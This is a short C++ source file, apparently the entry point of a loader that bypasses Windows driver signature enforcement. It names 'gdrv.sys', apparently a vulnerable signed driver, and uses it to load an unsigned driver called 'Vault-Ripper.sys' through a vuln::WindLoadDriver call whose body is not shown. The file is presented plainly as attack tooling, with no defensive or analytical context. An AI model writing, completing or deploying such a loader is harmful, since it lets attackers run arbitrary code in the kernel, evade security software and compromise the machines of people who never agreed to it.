#include "includes.h"

wchar_t LoaderName[] = L"gdrv.sys";  
wchar_t Driver_Name[] = L"Vault-Ripper.sys";

int main() {
	int option;

	std::wcout << ( "[*] DSE Loader Entry Called!\n" );
	NTSTATUS stat = vuln::WindLoadDriver( LoaderName, Driver_Name, 0 );


	system( "pause" );
	return 0;
}